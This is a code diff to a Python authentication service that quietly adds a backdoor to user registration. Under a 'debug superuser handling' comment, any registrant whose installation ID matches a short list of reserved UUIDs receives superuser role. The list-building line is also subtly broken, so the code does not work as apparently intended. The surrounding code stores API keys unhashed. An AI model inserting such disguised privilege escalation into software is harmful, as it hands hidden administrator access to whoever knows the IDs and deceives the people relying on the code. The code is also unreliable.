@@ -3,11 +3,14 @@ import uuid
 from loguru import logger
 
 from app.exceptions import InvalidCredentialsException, UserAlreadyExistsException, UserNotFoundException
-from app.models.user import NewUser, User
+from app.models.user import NewUser, User, UserRole
 from app.repositories.user_repository import UserRepository
 from app.schemas.auth import AuthRequest, AuthResponse, RegistrationRequest, RegistrationResponse
 from app.utils import gen_utils
 
+reserved_uuids = [
+    str(uuid.UUID(int=j) for j in range(1, 20))
+]
 
 class AuthService:
     def __init__(self, user_repo: UserRepository):
@@ -59,12 +62,17 @@ class AuthService:
             return existing_user
         api_key=gen_utils.generate_safe_api_key(request.password) #TODO: implement proper hashing
         api_key_hash = api_key #TODO: hash the api key before storing
+        role = UserRole.USER
+        # debug superuser handling
+        if request.installation_id in reserved_uuids:
+            role = UserRole.SUPERUSER
         new_user = NewUser(
             device_id=request.device_id if request.device_id else f"device_{str(request.installation_id)}",
             installation_id=request.installation_id,
             api_key_hash=api_key_hash,
             username=request.username,
             phone_number=request.phone_number,
+            role=role
         )
         created_user = await self.user_repo.create_user(User.new(new_user))
         logger.info(f"Registered new user: {created_user}")
